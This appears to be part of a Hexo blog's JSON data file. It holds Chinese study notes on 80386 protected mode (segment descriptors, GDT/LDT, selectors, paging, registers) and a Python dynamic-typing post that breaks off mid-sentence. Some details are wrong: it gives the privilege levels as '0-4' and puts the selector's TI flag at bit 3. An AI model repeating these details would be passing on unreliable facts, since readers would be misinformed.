hear.</strong></p>\n<p>Email：<a href=\"mailto:wusup3rb@163.com\" target=\"_blank\" rel=\"noopener\">wusup3rb@163.com</a></p>\n<p>Wechat：WuSup3rb</p>\n"},{"title":"tags","date":"2019-02-21T06:17:20.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2019-02-21 14:17:20\n---\n","updated":"2019-02-21T06:17:20.184Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cjuam83im00037or05c29jyna","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Win32编程基础Chapter 1：80386 CPU","date":"2019-04-01T01:37:37.000Z","_content":"\n#### 0x00 80386处理器有三种工作模式\n\n- 实模式：为兼容8086处理器的模式，该模式下80386与8086工作等同。DOS操作系统运行于该模式下。\n- 保护模式：32位寻址，寻址空间4GB，支持内存分页，多任务等。Windows操作系统运行于该模式下。\n- 虚拟86模式：为了在保护模式下运行8086程序而产生的模式。\n\n<!-- more -->\n\n#### 0x01 优先级机制\n\n- 在保护模式下，80386CPU还支持优先级机制，不同的程序可以运行在不同的优先级上。\n- 分四个优先级（0-4）,操作系统运行在0优先级上，应用程序运行在比较低的优先级上。\n\n#### 0x02 寻址\n\n- 在80386处理器中，有32根地址总线，寻址空间为4G，而通用寄存器也都是32位的，意味着不再需要段地址+偏移地址的方式进行寻址，可直接使用任意通用寄存器进行寻址。\n- 虽然不再需要段地址+偏移地址的方式进行寻址，但是并不意味着段寄存器就没用了，且看下面。\n\n#### 0x03 段描述符\n\n在保护模式下，一个地址空间能否被写入、可以被多少优先级的代码写入以及是否允许被执行等安全问题需要被考虑，因此就需要为一个地址空间定义一些安全方面的属性。\n\n这些属性需要用64位长的数据才能表示完全，这64位长的数据称为段描述符（Segment Descriptor）。\n\n段描述符包含一个地址空间（段）的：基址（起始地址）、限长、优先级等。这个空间就相当于一个段。一个个地址空间相当于一个个段。\n\n#### 0x04 段描述符表与段选择器\n\n由于段寄存器是16位的，并不能存放64位长的段描述符，解决办法是将所有地址空间的段描述符在指定内存中顺序存放，从而形成一个段描述符表（Descriptor Table）。\n\n而16位段寄存器用来从段描述符表中索引一个地址空间的段描述符。此时，段寄存器不再存放段地址，而是作为段选择器（Segment Selector）。\n\n#### 0x05 段描述符表分为两种：\n\nGDT：Global Descriptor Table,全局描述符表。\n\n> 它包含系统中所有任务都可用的段描述符，通常包含操作系统使用的代码段、数据段、栈段的描述符以及各个任务的LDT段等。全局描述符表只有一个。即主要是一些公用的资源的描述符。\n\nLDT：Local Descriptor Table,局部描述符表。\n\n> 每个任务都有自己独立的LDT，它包含任务的数据段、代码段、栈段等的描述符。即任务内部的内存也根据属性不同划分为不同的内存段。\n\nPS：每个任务的局部描述符表使用不同的内存段存储，存储局部描述符表所占用的内存段的段描述符被当作系统描述符放在GDT中。\n\n#### 0x06 80386处理器引入两个新的寄存器用来管理段描述符表：\n\nGDTR：是一个48位寄存器，指向全局描述符表（GDT），高32位存储GDT的基地址，是直接的内存地址。低16位储存限长（表的长度）。\n\nLDTR：是一个16位寄存器，与GDTR不同，LDTR与其他段寄存器一样，存储的是索引值。存储的是局部描述表内存段的段描述符在GDT中的索引。\n\n#### 0x07 16位的段寄存器（CS、DS、ES、FS、GS、SS）：\n\n实际只用高13位来作为索引值。\n\n剩下三个比特位：\n\n- 第0、1位：程序的优先级位RPL。\n- 第3位： TI位，用于决定在哪个描述符表中进行索引：\n  - TI=0，在GDT中索引段描述符。\n  - TI=1，在LDT中索引段描述符。\n\n#### 0x08 总结\n\nGDT主要存放一些公用的资源以及各个任务的LDT内存段的描述符。GDT只有一个\n\nLDT主要存放各个任务的栈段、数据段等内存段的描述符，LDT可以有多个，LDT本身所占用的内存段的描述符存储在GDT中。\n\nGDTR是48位的寄存器，存储（指向）GDT的内存的起始地址。\n\nLDTR是16位的寄存器，作为到GDT中寻找任务的LDT内存段的索引。\n\n> 要找到任务中各个段的描述符，首先要找到任务的LDT，要找到任务的LDT，就使用LDTR到GDT中去索引查找。\n\n16位的寄存器是作为最终在GDT或LDT中索引的值。至于在哪个表索引，取决于第3个比特位。\n\n![](00-win32编程基础Chapter-1\\QQ截图20190401094016.png)\n\n#### 0x09 分页机制\n\n经过以上操作得到的地址称为线性地址：\n\n- 若未启用分页机制，得到的线性地址就是物理内存地址\n- 若启用了分页机制，得到的线性地址是一个虚拟地址，通过页表映射的真正的物理内存地址。 \n\n分页机制解决了8086的内存碎片问题。\n\n页表不仅规定了地址的映射，还规定了页表的属性，如，是否可读、可写、可执行。\n\n**Windows是分时多任务操作系统，CPU时间被划分为一个个时间片后分配给不同程序，然后不断切换使用。即CPU在某一时间片内实际只运行一个程序，那么在该时间片内，除了当前时间片的程序外其他程序并不需要被加载到内存中，这也是为什么每个程序都可以使用2\\*\\*32B的内存空间大小的原因。**\n\n> 这也是得益于分页机制存在的原因，因为分页机制会自动将线性地址映射为内存的物理地址，因此我们只需要针对这4GB内存空间编程即可，至于如何将我们程序的地址转换为物理地址便交给操作系统的分页机制。\n\n操作系统DLL由于要被所有程序调用，所以会一直存在内存中；另外一些用户DLL可能被多个程序使用，那么在这些程序的时间片内，也会一直存在于内存中。\n\n#### 0x0a Win32 寄存器\n\n32位通用寄存器：EAX、EBX、ECX、EDX,它们的低16位对应：AX、BX、CX、DX,它们的低16位又可分为高8位和低8位：AH\\AL 、BH\\BL 、CH\\CL 、 DH\\DL。\n\n有2个32位寄存器ESI和EDI称为变址寄存器。其低16位对应先前CPU中的SI和DI。它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式。\n\n有2个32位寄存器EBP和ESP。其低16位对应先前CPU中的BP和SP。寄存器EBP、ESP、BP和SP称为指针寄存器。\n\n- BP 为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据。\n- SP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。\n\n32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。\n\n段寄存器都不再被需要给出段地址，变成了段选择器：CS、DS、SS、ES、FS、GS。在Win32编程中，用户基本不用关心段寄存器，因为它们是操作系统自动安排好的。","source":"_posts/00-win32编程基础Chapter-1.md","raw":"---\ntitle: Win32编程基础Chapter 1：80386 CPU\ndate: 2019-04-01 09:37:37\ntags: \n\t- Win32\n\t- 汇编语言\ncategories: Win32\n---\n\n#### 0x00 80386处理器有三种工作模式\n\n- 实模式：为兼容8086处理器的模式，该模式下80386与8086工作等同。DOS操作系统运行于该模式下。\n- 保护模式：32位寻址，寻址空间4GB，支持内存分页，多任务等。Windows操作系统运行于该模式下。\n- 虚拟86模式：为了在保护模式下运行8086程序而产生的模式。\n\n<!-- more -->\n\n#### 0x01 优先级机制\n\n- 在保护模式下，80386CPU还支持优先级机制，不同的程序可以运行在不同的优先级上。\n- 分四个优先级（0-4）,操作系统运行在0优先级上，应用程序运行在比较低的优先级上。\n\n#### 0x02 寻址\n\n- 在80386处理器中，有32根地址总线，寻址空间为4G，而通用寄存器也都是32位的，意味着不再需要段地址+偏移地址的方式进行寻址，可直接使用任意通用寄存器进行寻址。\n- 虽然不再需要段地址+偏移地址的方式进行寻址，但是并不意味着段寄存器就没用了，且看下面。\n\n#### 0x03 段描述符\n\n在保护模式下，一个地址空间能否被写入、可以被多少优先级的代码写入以及是否允许被执行等安全问题需要被考虑，因此就需要为一个地址空间定义一些安全方面的属性。\n\n这些属性需要用64位长的数据才能表示完全，这64位长的数据称为段描述符（Segment Descriptor）。\n\n段描述符包含一个地址空间（段）的：基址（起始地址）、限长、优先级等。这个空间就相当于一个段。一个个地址空间相当于一个个段。\n\n#### 0x04 段描述符表与段选择器\n\n由于段寄存器是16位的，并不能存放64位长的段描述符，解决办法是将所有地址空间的段描述符在指定内存中顺序存放，从而形成一个段描述符表（Descriptor Table）。\n\n而16位段寄存器用来从段描述符表中索引一个地址空间的段描述符。此时，段寄存器不再存放段地址，而是作为段选择器（Segment Selector）。\n\n#### 0x05 段描述符表分为两种：\n\nGDT：Global Descriptor Table,全局描述符表。\n\n> 它包含系统中所有任务都可用的段描述符，通常包含操作系统使用的代码段、数据段、栈段的描述符以及各个任务的LDT段等。全局描述符表只有一个。即主要是一些公用的资源的描述符。\n\nLDT：Local Descriptor Table,局部描述符表。\n\n> 每个任务都有自己独立的LDT，它包含任务的数据段、代码段、栈段等的描述符。即任务内部的内存也根据属性不同划分为不同的内存段。\n\nPS：每个任务的局部描述符表使用不同的内存段存储，存储局部描述符表所占用的内存段的段描述符被当作系统描述符放在GDT中。\n\n#### 0x06 80386处理器引入两个新的寄存器用来管理段描述符表：\n\nGDTR：是一个48位寄存器，指向全局描述符表（GDT），高32位存储GDT的基地址，是直接的内存地址。低16位储存限长（表的长度）。\n\nLDTR：是一个16位寄存器，与GDTR不同，LDTR与其他段寄存器一样，存储的是索引值。存储的是局部描述表内存段的段描述符在GDT中的索引。\n\n#### 0x07 16位的段寄存器（CS、DS、ES、FS、GS、SS）：\n\n实际只用高13位来作为索引值。\n\n剩下三个比特位：\n\n- 第0、1位：程序的优先级位RPL。\n- 第3位： TI位，用于决定在哪个描述符表中进行索引：\n  - TI=0，在GDT中索引段描述符。\n  - TI=1，在LDT中索引段描述符。\n\n#### 0x08 总结\n\nGDT主要存放一些公用的资源以及各个任务的LDT内存段的描述符。GDT只有一个\n\nLDT主要存放各个任务的栈段、数据段等内存段的描述符，LDT可以有多个，LDT本身所占用的内存段的描述符存储在GDT中。\n\nGDTR是48位的寄存器，存储（指向）GDT的内存的起始地址。\n\nLDTR是16位的寄存器，作为到GDT中寻找任务的LDT内存段的索引。\n\n> 要找到任务中各个段的描述符，首先要找到任务的LDT，要找到任务的LDT，就使用LDTR到GDT中去索引查找。\n\n16位的寄存器是作为最终在GDT或LDT中索引的值。至于在哪个表索引，取决于第3个比特位。\n\n![](00-win32编程基础Chapter-1\\QQ截图20190401094016.png)\n\n#### 0x09 分页机制\n\n经过以上操作得到的地址称为线性地址：\n\n- 若未启用分页机制，得到的线性地址就是物理内存地址\n- 若启用了分页机制，得到的线性地址是一个虚拟地址，通过页表映射的真正的物理内存地址。 \n\n分页机制解决了8086的内存碎片问题。\n\n页表不仅规定了地址的映射，还规定了页表的属性，如，是否可读、可写、可执行。\n\n**Windows是分时多任务操作系统，CPU时间被划分为一个个时间片后分配给不同程序，然后不断切换使用。即CPU在某一时间片内实际只运行一个程序，那么在该时间片内，除了当前时间片的程序外其他程序并不需要被加载到内存中，这也是为什么每个程序都可以使用2\\*\\*32B的内存空间大小的原因。**\n\n> 这也是得益于分页机制存在的原因，因为分页机制会自动将线性地址映射为内存的物理地址，因此我们只需要针对这4GB内存空间编程即可，至于如何将我们程序的地址转换为物理地址便交给操作系统的分页机制。\n\n操作系统DLL由于要被所有程序调用，所以会一直存在内存中；另外一些用户DLL可能被多个程序使用，那么在这些程序的时间片内，也会一直存在于内存中。\n\n#### 0x0a Win32 寄存器\n\n32位通用寄存器：EAX、EBX、ECX、EDX,它们的低16位对应：AX、BX、CX、DX,它们的低16位又可分为高8位和低8位：AH\\AL 、BH\\BL 、CH\\CL 、 DH\\DL。\n\n有2个32位寄存器ESI和EDI称为变址寄存器。其低16位对应先前CPU中的SI和DI。它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式。\n\n有2个32位寄存器EBP和ESP。其低16位对应先前CPU中的BP和SP。寄存器EBP、ESP、BP和SP称为指针寄存器。\n\n- BP 为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据。\n- SP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。\n\n32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。\n\n段寄存器都不再被需要给出段地址，变成了段选择器：CS、DS、SS、ES、FS、GS。在Win32编程中，用户基本不用关心段寄存器，因为它们是操作系统自动安排好的。","slug":"00-win32编程基础Chapter-1","published":1,"updated":"2019-04-01T02:45:12.273Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ib00007or0kbo8va3v","content":"<h4 id=\"0x00-80386处理器有三种工作模式\"><a href=\"#0x00-80386处理器有三种工作模式\" class=\"headerlink\" title=\"0x00 80386处理器有三种工作模式\"></a>0x00 80386处理器有三种工作模式</h4><ul>\n<li>实模式：为兼容8086处理器的模式，该模式下80386与8086工作等同。DOS操作系统运行于该模式下。</li>\n<li>保护模式：32位寻址，寻址空间4GB，支持内存分页，多任务等。Windows操作系统运行于该模式下。</li>\n<li>虚拟86模式：为了在保护模式下运行8086程序而产生的模式。</li>\n</ul>\n<a id=\"more\"></a>\n<h4 id=\"0x01-优先级机制\"><a href=\"#0x01-优先级机制\" class=\"headerlink\" title=\"0x01 优先级机制\"></a>0x01 优先级机制</h4><ul>\n<li>在保护模式下，80386CPU还支持优先级机制，不同的程序可以运行在不同的优先级上。</li>\n<li>分四个优先级（0-4）,操作系统运行在0优先级上，应用程序运行在比较低的优先级上。</li>\n</ul>\n<h4 id=\"0x02-寻址\"><a href=\"#0x02-寻址\" class=\"headerlink\" title=\"0x02 寻址\"></a>0x02 寻址</h4><ul>\n<li>在80386处理器中，有32根地址总线，寻址空间为4G，而通用寄存器也都是32位的，意味着不再需要段地址+偏移地址的方式进行寻址，可直接使用任意通用寄存器进行寻址。</li>\n<li>虽然不再需要段地址+偏移地址的方式进行寻址，但是并不意味着段寄存器就没用了，且看下面。</li>\n</ul>\n<h4 id=\"0x03-段描述符\"><a href=\"#0x03-段描述符\" class=\"headerlink\" title=\"0x03 段描述符\"></a>0x03 段描述符</h4><p>在保护模式下，一个地址空间能否被写入、可以被多少优先级的代码写入以及是否允许被执行等安全问题需要被考虑，因此就需要为一个地址空间定义一些安全方面的属性。</p>\n<p>这些属性需要用64位长的数据才能表示完全，这64位长的数据称为段描述符（Segment Descriptor）。</p>\n<p>段描述符包含一个地址空间（段）的：基址（起始地址）、限长、优先级等。这个空间就相当于一个段。一个个地址空间相当于一个个段。</p>\n<h4 id=\"0x04-段描述符表与段选择器\"><a href=\"#0x04-段描述符表与段选择器\" class=\"headerlink\" title=\"0x04 段描述符表与段选择器\"></a>0x04 段描述符表与段选择器</h4><p>由于段寄存器是16位的，并不能存放64位长的段描述符，解决办法是将所有地址空间的段描述符在指定内存中顺序存放，从而形成一个段描述符表（Descriptor Table）。</p>\n<p>而16位段寄存器用来从段描述符表中索引一个地址空间的段描述符。此时，段寄存器不再存放段地址，而是作为段选择器（Segment Selector）。</p>\n<h4 id=\"0x05-段描述符表分为两种：\"><a href=\"#0x05-段描述符表分为两种：\" class=\"headerlink\" title=\"0x05 段描述符表分为两种：\"></a>0x05 段描述符表分为两种：</h4><p>GDT：Global Descriptor Table,全局描述符表。</p>\n<blockquote>\n<p>它包含系统中所有任务都可用的段描述符，通常包含操作系统使用的代码段、数据段、栈段的描述符以及各个任务的LDT段等。全局描述符表只有一个。即主要是一些公用的资源的描述符。</p>\n</blockquote>\n<p>LDT：Local Descriptor Table,局部描述符表。</p>\n<blockquote>\n<p>每个任务都有自己独立的LDT，它包含任务的数据段、代码段、栈段等的描述符。即任务内部的内存也根据属性不同划分为不同的内存段。</p>\n</blockquote>\n<p>PS：每个任务的局部描述符表使用不同的内存段存储，存储局部描述符表所占用的内存段的段描述符被当作系统描述符放在GDT中。</p>\n<h4 id=\"0x06-80386处理器引入两个新的寄存器用来管理段描述符表：\"><a href=\"#0x06-80386处理器引入两个新的寄存器用来管理段描述符表：\" class=\"headerlink\" title=\"0x06 80386处理器引入两个新的寄存器用来管理段描述符表：\"></a>0x06 80386处理器引入两个新的寄存器用来管理段描述符表：</h4><p>GDTR：是一个48位寄存器，指向全局描述符表（GDT），高32位存储GDT的基地址，是直接的内存地址。低16位储存限长（表的长度）。</p>\n<p>LDTR：是一个16位寄存器，与GDTR不同，LDTR与其他段寄存器一样，存储的是索引值。存储的是局部描述表内存段的段描述符在GDT中的索引。</p>\n<h4 id=\"0x07-16位的段寄存器（CS、DS、ES、FS、GS、SS）：\"><a href=\"#0x07-16位的段寄存器（CS、DS、ES、FS、GS、SS）：\" class=\"headerlink\" title=\"0x07 16位的段寄存器（CS、DS、ES、FS、GS、SS）：\"></a>0x07 16位的段寄存器（CS、DS、ES、FS、GS、SS）：</h4><p>实际只用高13位来作为索引值。</p>\n<p>剩下三个比特位：</p>\n<ul>\n<li>第0、1位：程序的优先级位RPL。</li>\n<li>第3位： TI位，用于决定在哪个描述符表中进行索引：<ul>\n<li>TI=0，在GDT中索引段描述符。</li>\n<li>TI=1，在LDT中索引段描述符。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"0x08-总结\"><a href=\"#0x08-总结\" class=\"headerlink\" title=\"0x08 总结\"></a>0x08 总结</h4><p>GDT主要存放一些公用的资源以及各个任务的LDT内存段的描述符。GDT只有一个</p>\n<p>LDT主要存放各个任务的栈段、数据段等内存段的描述符，LDT可以有多个，LDT本身所占用的内存段的描述符存储在GDT中。</p>\n<p>GDTR是48位的寄存器，存储（指向）GDT的内存的起始地址。</p>\n<p>LDTR是16位的寄存器，作为到GDT中寻找任务的LDT内存段的索引。</p>\n<blockquote>\n<p>要找到任务中各个段的描述符，首先要找到任务的LDT，要找到任务的LDT，就使用LDTR到GDT中去索引查找。</p>\n</blockquote>\n<p>16位的寄存器是作为最终在GDT或LDT中索引的值。至于在哪个表索引，取决于第3个比特位。</p>\n<p><img src=\"/2019/04/01/00-win32编程基础Chapter-1/QQ截图20190401094016.png\" alt></p>\n<h4 id=\"0x09-分页机制\"><a href=\"#0x09-分页机制\" class=\"headerlink\" title=\"0x09 分页机制\"></a>0x09 分页机制</h4><p>经过以上操作得到的地址称为线性地址：</p>\n<ul>\n<li>若未启用分页机制，得到的线性地址就是物理内存地址</li>\n<li>若启用了分页机制，得到的线性地址是一个虚拟地址，通过页表映射的真正的物理内存地址。 </li>\n</ul>\n<p>分页机制解决了8086的内存碎片问题。</p>\n<p>页表不仅规定了地址的映射，还规定了页表的属性，如，是否可读、可写、可执行。</p>\n<p><strong>Windows是分时多任务操作系统，CPU时间被划分为一个个时间片后分配给不同程序，然后不断切换使用。即CPU在某一时间片内实际只运行一个程序，那么在该时间片内，除了当前时间片的程序外其他程序并不需要被加载到内存中，这也是为什么每个程序都可以使用2**32B的内存空间大小的原因。</strong></p>\n<blockquote>\n<p>这也是得益于分页机制存在的原因，因为分页机制会自动将线性地址映射为内存的物理地址，因此我们只需要针对这4GB内存空间编程即可，至于如何将我们程序的地址转换为物理地址便交给操作系统的分页机制。</p>\n</blockquote>\n<p>操作系统DLL由于要被所有程序调用，所以会一直存在内存中；另外一些用户DLL可能被多个程序使用，那么在这些程序的时间片内，也会一直存在于内存中。</p>\n<h4 id=\"0x0a-Win32-寄存器\"><a href=\"#0x0a-Win32-寄存器\" class=\"headerlink\" title=\"0x0a Win32 寄存器\"></a>0x0a Win32 寄存器</h4><p>32位通用寄存器：EAX、EBX、ECX、EDX,它们的低16位对应：AX、BX、CX、DX,它们的低16位又可分为高8位和低8位：AH\\AL 、BH\\BL 、CH\\CL 、 DH\\DL。</p>\n<p>有2个32位寄存器ESI和EDI称为变址寄存器。其低16位对应先前CPU中的SI和DI。它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式。</p>\n<p>有2个32位寄存器EBP和ESP。其低16位对应先前CPU中的BP和SP。寄存器EBP、ESP、BP和SP称为指针寄存器。</p>\n<ul>\n<li>BP 为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据。</li>\n<li>SP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。</li>\n</ul>\n<p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。</p>\n<p>段寄存器都不再被需要给出段地址，变成了段选择器：CS、DS、SS、ES、FS、GS。在Win32编程中，用户基本不用关心段寄存器，因为它们是操作系统自动安排好的。</p>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-80386处理器有三种工作模式\"><a href=\"#0x00-80386处理器有三种工作模式\" class=\"headerlink\" title=\"0x00 80386处理器有三种工作模式\"></a>0x00 80386处理器有三种工作模式</h4><ul>\n<li>实模式：为兼容8086处理器的模式，该模式下80386与8086工作等同。DOS操作系统运行于该模式下。</li>\n<li>保护模式：32位寻址，寻址空间4GB，支持内存分页，多任务等。Windows操作系统运行于该模式下。</li>\n<li>虚拟86模式：为了在保护模式下运行8086程序而产生的模式。</li>\n</ul>","more":"<h4 id=\"0x01-优先级机制\"><a href=\"#0x01-优先级机制\" class=\"headerlink\" title=\"0x01 优先级机制\"></a>0x01 优先级机制</h4><ul>\n<li>在保护模式下，80386CPU还支持优先级机制，不同的程序可以运行在不同的优先级上。</li>\n<li>分四个优先级（0-4）,操作系统运行在0优先级上，应用程序运行在比较低的优先级上。</li>\n</ul>\n<h4 id=\"0x02-寻址\"><a href=\"#0x02-寻址\" class=\"headerlink\" title=\"0x02 寻址\"></a>0x02 寻址</h4><ul>\n<li>在80386处理器中，有32根地址总线，寻址空间为4G，而通用寄存器也都是32位的，意味着不再需要段地址+偏移地址的方式进行寻址，可直接使用任意通用寄存器进行寻址。</li>\n<li>虽然不再需要段地址+偏移地址的方式进行寻址，但是并不意味着段寄存器就没用了，且看下面。</li>\n</ul>\n<h4 id=\"0x03-段描述符\"><a href=\"#0x03-段描述符\" class=\"headerlink\" title=\"0x03 段描述符\"></a>0x03 段描述符</h4><p>在保护模式下，一个地址空间能否被写入、可以被多少优先级的代码写入以及是否允许被执行等安全问题需要被考虑，因此就需要为一个地址空间定义一些安全方面的属性。</p>\n<p>这些属性需要用64位长的数据才能表示完全，这64位长的数据称为段描述符（Segment Descriptor）。</p>\n<p>段描述符包含一个地址空间（段）的：基址（起始地址）、限长、优先级等。这个空间就相当于一个段。一个个地址空间相当于一个个段。</p>\n<h4 id=\"0x04-段描述符表与段选择器\"><a href=\"#0x04-段描述符表与段选择器\" class=\"headerlink\" title=\"0x04 段描述符表与段选择器\"></a>0x04 段描述符表与段选择器</h4><p>由于段寄存器是16位的，并不能存放64位长的段描述符，解决办法是将所有地址空间的段描述符在指定内存中顺序存放，从而形成一个段描述符表（Descriptor Table）。</p>\n<p>而16位段寄存器用来从段描述符表中索引一个地址空间的段描述符。此时，段寄存器不再存放段地址，而是作为段选择器（Segment Selector）。</p>\n<h4 id=\"0x05-段描述符表分为两种：\"><a href=\"#0x05-段描述符表分为两种：\" class=\"headerlink\" title=\"0x05 段描述符表分为两种：\"></a>0x05 段描述符表分为两种：</h4><p>GDT：Global Descriptor Table,全局描述符表。</p>\n<blockquote>\n<p>它包含系统中所有任务都可用的段描述符，通常包含操作系统使用的代码段、数据段、栈段的描述符以及各个任务的LDT段等。全局描述符表只有一个。即主要是一些公用的资源的描述符。</p>\n</blockquote>\n<p>LDT：Local Descriptor Table,局部描述符表。</p>\n<blockquote>\n<p>每个任务都有自己独立的LDT，它包含任务的数据段、代码段、栈段等的描述符。即任务内部的内存也根据属性不同划分为不同的内存段。</p>\n</blockquote>\n<p>PS：每个任务的局部描述符表使用不同的内存段存储，存储局部描述符表所占用的内存段的段描述符被当作系统描述符放在GDT中。</p>\n<h4 id=\"0x06-80386处理器引入两个新的寄存器用来管理段描述符表：\"><a href=\"#0x06-80386处理器引入两个新的寄存器用来管理段描述符表：\" class=\"headerlink\" title=\"0x06 80386处理器引入两个新的寄存器用来管理段描述符表：\"></a>0x06 80386处理器引入两个新的寄存器用来管理段描述符表：</h4><p>GDTR：是一个48位寄存器，指向全局描述符表（GDT），高32位存储GDT的基地址，是直接的内存地址。低16位储存限长（表的长度）。</p>\n<p>LDTR：是一个16位寄存器，与GDTR不同，LDTR与其他段寄存器一样，存储的是索引值。存储的是局部描述表内存段的段描述符在GDT中的索引。</p>\n<h4 id=\"0x07-16位的段寄存器（CS、DS、ES、FS、GS、SS）：\"><a href=\"#0x07-16位的段寄存器（CS、DS、ES、FS、GS、SS）：\" class=\"headerlink\" title=\"0x07 16位的段寄存器（CS、DS、ES、FS、GS、SS）：\"></a>0x07 16位的段寄存器（CS、DS、ES、FS、GS、SS）：</h4><p>实际只用高13位来作为索引值。</p>\n<p>剩下三个比特位：</p>\n<ul>\n<li>第0、1位：程序的优先级位RPL。</li>\n<li>第3位： TI位，用于决定在哪个描述符表中进行索引：<ul>\n<li>TI=0，在GDT中索引段描述符。</li>\n<li>TI=1，在LDT中索引段描述符。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"0x08-总结\"><a href=\"#0x08-总结\" class=\"headerlink\" title=\"0x08 总结\"></a>0x08 总结</h4><p>GDT主要存放一些公用的资源以及各个任务的LDT内存段的描述符。GDT只有一个</p>\n<p>LDT主要存放各个任务的栈段、数据段等内存段的描述符，LDT可以有多个，LDT本身所占用的内存段的描述符存储在GDT中。</p>\n<p>GDTR是48位的寄存器，存储（指向）GDT的内存的起始地址。</p>\n<p>LDTR是16位的寄存器，作为到GDT中寻找任务的LDT内存段的索引。</p>\n<blockquote>\n<p>要找到任务中各个段的描述符，首先要找到任务的LDT，要找到任务的LDT，就使用LDTR到GDT中去索引查找。</p>\n</blockquote>\n<p>16位的寄存器是作为最终在GDT或LDT中索引的值。至于在哪个表索引，取决于第3个比特位。</p>\n<p><img src=\"/2019/04/01/00-win32编程基础Chapter-1/QQ截图20190401094016.png\" alt></p>\n<h4 id=\"0x09-分页机制\"><a href=\"#0x09-分页机制\" class=\"headerlink\" title=\"0x09 分页机制\"></a>0x09 分页机制</h4><p>经过以上操作得到的地址称为线性地址：</p>\n<ul>\n<li>若未启用分页机制，得到的线性地址就是物理内存地址</li>\n<li>若启用了分页机制，得到的线性地址是一个虚拟地址，通过页表映射的真正的物理内存地址。 </li>\n</ul>\n<p>分页机制解决了8086的内存碎片问题。</p>\n<p>页表不仅规定了地址的映射，还规定了页表的属性，如，是否可读、可写、可执行。</p>\n<p><strong>Windows是分时多任务操作系统，CPU时间被划分为一个个时间片后分配给不同程序，然后不断切换使用。即CPU在某一时间片内实际只运行一个程序，那么在该时间片内，除了当前时间片的程序外其他程序并不需要被加载到内存中，这也是为什么每个程序都可以使用2**32B的内存空间大小的原因。</strong></p>\n<blockquote>\n<p>这也是得益于分页机制存在的原因，因为分页机制会自动将线性地址映射为内存的物理地址，因此我们只需要针对这4GB内存空间编程即可，至于如何将我们程序的地址转换为物理地址便交给操作系统的分页机制。</p>\n</blockquote>\n<p>操作系统DLL由于要被所有程序调用，所以会一直存在内存中；另外一些用户DLL可能被多个程序使用，那么在这些程序的时间片内，也会一直存在于内存中。</p>\n<h4 id=\"0x0a-Win32-寄存器\"><a href=\"#0x0a-Win32-寄存器\" class=\"headerlink\" title=\"0x0a Win32 寄存器\"></a>0x0a Win32 寄存器</h4><p>32位通用寄存器：EAX、EBX、ECX、EDX,它们的低16位对应：AX、BX、CX、DX,它们的低16位又可分为高8位和低8位：AH\\AL 、BH\\BL 、CH\\CL 、 DH\\DL。</p>\n<p>有2个32位寄存器ESI和EDI称为变址寄存器。其低16位对应先前CPU中的SI和DI。它们主要用于存放存储单元在段内的偏移量，用它们可实现多种存储器操作数的寻址方式。</p>\n<p>有2个32位寄存器EBP和ESP。其低16位对应先前CPU中的BP和SP。寄存器EBP、ESP、BP和SP称为指针寄存器。</p>\n<ul>\n<li>BP 为基指针(Base Pointer)寄存器，用它可直接存取堆栈中的数据。</li>\n<li>SP为堆栈指针(Stack Pointer)寄存器，用它只可访问栈顶。</li>\n</ul>\n<p>32位CPU把指令指针扩展到32位，并记作EIP，EIP的低16位与先前CPU中的IP作用相同。</p>\n<p>段寄存器都不再被需要给出段地址，变成了段选择器：CS、DS、SS、ES、FS、GS。在Win32编程中，用户基本不用关心段寄存器，因为它们是操作系统自动安排好的。</p>"},{"title":"Python基础学习系列Chapter 1：动态类型","date":"2019-03-18T08:24:35.000Z","_content":"\n### 可变类型与不可变类型\n\nPython的对象都可分为可变性对象和不可变性对象。\n\n可变性：可以原处修改。即修改这个对象。\n\n> \tlist = [1,2,3]     #这是一个列表对象list\n> \tlist[0]=0          #此时list内容变成了[0,2,3]，但还是之前的列表对象list。\n\n不可变性：不可原处修改。即不能修改该对象，换句话说，修改了，那就不是原来的那个对象了。\n\n<!-- more -->\n\n核心对象：\n\n> **可变对象**：列表、字典、集合。\n>\n> **不可变对象**：数字、字符串、元组。\t\n\n### 动态类型\n\n**对象拥有两个头部信息**：\n\n类型标识符：标识对象的类型。(type)\n\n引用计数器：记录对象被引用的次数。\n\n> 因此类型是属于对象的，而不是变量，对象的头部信息指明了对象类型，因此不用声明变量的类型。\n\n**变量、对象、引用**\n\n变量和对象实质是不同的两部分内存空间。\n\n变量是在进行赋值操作时创建的。\n\n引用：可看做是一个指针。\n\n赋值的实质：变量引用了对象，即变量通过指针指向对象的内存地址空间。\n\n> 例：a=1      #变量a引用了对象1，a拥有指向对象1的内存地址的指针。\n\n**共享引用**\n\n对象可以被多个变量引用，反过来说一个变量只是对象的一个引用而已。\n\n> 例：a=1;b=a  #b会引用a引用的对象，即b会指向a所指向的内存空间，a,b共享引用了对象1。\n\n**共享引用和原处修改**\n\n对于共享引用了可原处修改的对象要注意，因为修改可原处修改的对象会导致所有的共享引用改变。\n\n> \t例： \n> \t\t\tL1=[1,2,3]\n> \t\t\tL2=L1\n> \t\t\tL2[0]=0\n> \t\t\n>\n> \t\t上面的操作会改变L1,因为L1、L2共享引用了同一个列表对象，而列表对象是可变对象，因此列表可以原处修改。\n\n**垃圾回收机制**\n\n对象每被引用一次，对象头部的引用计数器会+1。\n当对象头部的引用计数为0时，对象将被回收。\n\n缓存机制：Python会缓存复用一些小的整数或小的字符串，为了加快速度。导致某些对象不会立即回收或多个变量。\n\n**is与==**\n\n- == 